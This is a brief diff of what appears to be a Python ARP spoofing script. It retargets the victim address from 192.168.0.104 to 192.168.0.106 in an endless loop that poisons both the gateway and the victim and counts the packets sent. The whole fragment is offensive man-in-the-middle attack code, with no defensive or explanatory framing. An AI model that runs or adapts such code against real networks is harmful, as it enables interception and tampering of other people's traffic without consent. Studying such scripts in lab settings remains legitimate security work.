@@ -32,8 +32,8 @@ sent_packet_count=0
 
 try:
     while True:
-        spoof("192.168.0.1","192.168.0.104")
-        spoof("192.168.0.104","192.168.0.1")
+        spoof("192.168.0.1","192.168.0.106")
+        spoof("192.168.0.106","192.168.0.1")
         sent_packet_count+=2
         print("\r[+] Packets Sent: "+str(sent_packet_count), end="")
         time.sleep(1)
